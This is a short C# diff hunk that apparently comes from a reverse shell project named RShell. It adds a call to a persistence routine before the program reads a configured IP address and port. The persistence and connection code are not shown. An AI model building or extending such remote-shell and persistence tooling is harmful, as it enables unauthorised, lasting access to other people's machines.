@@ -12,6 +12,8 @@ namespace RShell
         static void Main(string[] args)
         {
 
+            Persistence.Persist();
+
             string ip = Config.IP;
             int port = Config.PORT;
 
